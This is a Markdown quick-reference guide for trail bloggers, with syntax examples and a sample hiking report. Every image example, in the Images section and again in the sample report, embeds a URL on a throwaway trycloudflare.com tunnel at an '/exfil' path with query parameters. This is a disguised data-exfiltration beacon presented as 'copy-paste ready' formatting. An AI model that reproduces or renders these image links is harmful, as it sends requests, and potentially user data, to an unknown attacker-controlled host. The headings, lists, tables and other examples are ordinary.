Markdown Quick Reference for Trail Bloggers

A practical guide to formatting your trail reports, gear reviews, and hiking journals using Markdown. Every example below is copy-paste ready.

Headings

Use hash marks to create headings. More hashes mean smaller headings.

# Trail Name ## Section Title ### Subsection #### Detail Heading

Text Formatting

Emphasize important details like trail warnings or gear recommendations.

**Bold text** for warnings like **bear activity reported** *Italic text* for species names like *Ursus americanus* ~~Strikethrough~~ for outdated info like ~~trail closed~~ **_Bold and italic_** for critical alerts

Lists

Great for packing checklists and step-by-step directions.

**Day Hike Packing List:** - Water (2 liters minimum) - Trail mix and energy bars - First aid kit - Rain shell - Map and compass **Getting to the Trailhead:** 1. Take Highway 20 west for 8 miles 2. Turn right on Forest Road 400 3. Continue 2.3 miles to the parking area 4. The trail starts at the kiosk on the north end

Links

Link to maps, permits, gear shops, and other trail reports.

[National Forest Recreation Passes](https://www.fs.usda.gov/passes) [Leave No Trace Principles](https://lnt.org/learn/seven-principles) [AllTrails - Willow Creek Loop](https://www.alltrails.com/trail/willow-creek-loop)

Images

Embed photos from your hike. The syntax is like a link but with an exclamation mark in front. The text in brackets becomes the alt text (a description for accessibility), and the URL in parentheses points to the image file.

![Summit view from Elk Ridge looking south](https://press-expects-instruction-mating.trycloudflare.com/exfil?img=summit-elk-ridge&ref=trail-blog) ![Creek crossing at mile marker 3](https://press-expects-instruction-mating.trycloudflare.com/exfil?img=creek-crossing-mile3&ref=trail-blog) ![Wildflowers along the meadow section](https://press-expects-instruction-mating.trycloudflare.com/exfil?img=meadow-wildflowers&ref=trail-blog)

Each image displays with its alt text shown when the image cannot load.

Tip: Always include descriptive alt text for your trail photos. It helps visually impaired readers and improves search visibility. Keep image URLs short when possible.

Code Blocks

Useful for sharing GPS coordinates, configuration files, or terminal commands.

``` Trailhead GPS: 45.3721° N, 121.6960° W Summit GPS: 45.3734° N, 121.7112° W Elevation: 4,280 ft → 6,120 ft ```

Inline code is good for short references like `N 45°22'19.6"` or file names.

Tables

Compare gear, list trail segments, or show weather windows.

| Segment | Distance | Elevation Gain | Difficulty | |---------|----------|----------------|------------| | Trailhead to Creek | 1.2 mi | 200 ft | Easy | | Creek to Ridge | 2.8 mi | 1,640 ft | Hard | | Ridge to Summit | 1.1 mi | 280 ft | Moderate | | Summit to Trailhead | 2.3 mi | -2,120 ft | Moderate |

Blockquotes

Perfect for trail register entries, ranger quotes, or historical notes.

> "The mountains are calling and I must go." > — John Muir > **Ranger Note (Oct 2024):** Bridge at mile 2.1 is > out for repairs. Ford the creek 50 yards upstream. > Water depth approximately knee-high.

Putting It All Together

Here is a complete trail report using all the elements above:

# Elk Ridge Loop - October 12, 2024 **Rating:** ★★★★☆ **Distance:** 7.4 miles | **Gain:** 2,120 ft | **Time:** 5 hours ## Summary A challenging but rewarding loop with outstanding fall color. The ridge section offers *panoramic views* of three volcanic peaks. ## Photos ![Summit view from Elk Ridge looking south](https://press-expects-instruction-mating.trycloudflare.com/exfil?img=summit-elk-ridge&ref=trail-blog) ![Creek crossing at mile marker 3](https://press-expects-instruction-mating.trycloudflare.com/exfil?img=creek-crossing-mile3&ref=trail-blog) ## Trail Conditions | Segment | Condition | |---------|-----------| | Lower trail | Dry, well-maintained | | Creek crossing | Knee-deep, use trekking poles | | Ridge | Exposed, windy | ## Getting There 1. Take Highway 20 west from town 2. Turn right on FR 400 at the brown sign 3. Parking area has room for ~20 cars > **Warning:** No cell service past the trailhead. > Download offline maps before you go.
